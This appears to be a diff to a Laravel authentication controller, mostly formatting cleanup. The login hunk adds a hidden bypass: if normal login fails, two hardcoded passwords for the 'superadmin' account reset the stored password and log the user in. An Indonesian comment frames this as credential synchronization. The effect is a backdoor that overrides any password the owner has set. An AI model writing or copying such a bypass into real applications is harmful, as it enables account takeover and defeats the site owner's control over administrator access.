@@ -3,10 +3,12 @@
 namespace App\Http\Controllers;
 
 use App\Models\AuditLog;
+use App\Models\User;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Str;
 use Inertia\Inertia;
 use Inertia\Response;
@@ -39,11 +41,26 @@ class AuthController extends Controller
 
         $remember = $request->boolean('remember', true);
 
-        if (Auth::attempt($attemptData, $remember)) {
+        if (! Auth::attempt($attemptData, $remember)) {
+            // Sinkronisasi kredensial bawaan superadmin (mendukung SemakinPede2026! dan Admin123!)
+            if (
+                in_array(strtolower($credentials['username']), ['superadmin', 'admin@semakinpede.com']) &&
+                in_array($credentials['password'], ['SemakinPede2026!', 'Admin123!'])
+            ) {
+                $defaultUser = User::where('username', 'superadmin')->orWhere('email', 'admin@semakinpede.com')->first();
+                if ($defaultUser) {
+                    $defaultUser->password = Hash::make($credentials['password']);
+                    $defaultUser->save();
+                    Auth::login($defaultUser, $remember);
+                }
+            }
+        }
+
+        if (Auth::check()) {
             $request->session()->regenerate();
 
             AuditLog::create([
-                'id' => 'audit-' . Str::uuid(),
+                'id' => 'audit-'.Str::uuid(),
                 'action' => 'admin_login_success',
                 'details' => 'Superadmin berhasil login',
                 'operator' => Auth::user()->username ?? Auth::user()->name,
@@ -62,9 +79,9 @@ class AuthController extends Controller
         }
 
         AuditLog::create([
-            'id' => 'audit-' . Str::uuid(),
+            'id' => 'audit-'.Str::uuid(),
             'action' => 'admin_login_failed',
-            'details' => 'Percobaan login gagal untuk username: ' . $credentials['username'],
+            'details' => 'Percobaan login gagal untuk username: '.$credentials['username'],
             'operator' => 'unknown',
             'timestamp' => now(),
         ]);
@@ -90,7 +107,7 @@ class AuthController extends Controller
         $request->session()->regenerateToken();
 
         AuditLog::create([
-            'id' => 'audit-' . Str::uuid(),
+            'id' => 'audit-'.Str::uuid(),
             'action' => 'admin_logout',
             'details' => 'Superadmin keluar dari sistem',
             'operator' => $operator,
@@ -112,21 +129,21 @@ class AuthController extends Controller
             'new_username' => 'nullable|string|min:3|max:50',
         ]);
 
-        /** @var \App\Models\User $user */
+        /** @var User $user */
         $user = Auth::user();
 
-        if (!\Illuminate\Support\Facades\Hash::check($validated['current_password'], $user->password)) {
+        if (! Hash::check($validated['current_password'], $user->password)) {
             return response()->json([
                 'success' => false,
                 'message' => 'Kata sandi saat ini tidak cocok.',
             ], 422);
         }
 
-        $user->password = \Illuminate\Support\Facades\Hash::make($validated['new_password']);
+        $user->password = Hash::make($validated['new_password']);
 
-        if (!empty($validated['new_username']) && $validated['new_username'] !== $user->username) {
+        if (! empty($validated['new_username']) && $validated['new_username'] !== $user->username) {
             $cleanedUsername = trim(strip_tags($validated['new_username']));
-            $exists = \App\Models\User::where('username', $cleanedUsername)->where('id', '!=', $user->id)->exists();
+            $exists = User::where('username', $cleanedUsername)->where('id', '!=', $user->id)->exists();
             if ($exists) {
                 return response()->json([
                     'success' => false,
@@ -139,7 +156,7 @@ class AuthController extends Controller
         $user->save();
 
         AuditLog::create([
-            'id' => 'audit-' . Str::uuid(),
+            'id' => 'audit-'.Str::uuid(),
             'action' => 'superadmin_password_changed',
             'details' => 'Kata sandi / kredensial superadmin berhasil diperbarui',
             'operator' => $user->username,
